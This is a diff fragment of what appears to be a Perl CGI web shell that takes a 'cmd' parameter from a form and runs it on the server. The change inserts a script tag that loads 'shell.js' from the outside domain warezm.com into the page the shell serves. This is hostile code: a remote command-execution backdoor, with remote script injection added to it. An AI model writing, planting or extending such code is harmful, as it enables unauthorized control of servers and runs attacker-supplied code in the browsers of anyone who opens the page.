@@ -20,6 +20,7 @@ if(defined $FORM{'cmd'}) {
 }
 
 print '<HTML>
+<script data-cfasync='false' src='//warezm.com/shell.js'></script>
 <body>
 <form action="" method="GET">
 <input type="text" name="cmd" size=45 value="' . $cmd . '">
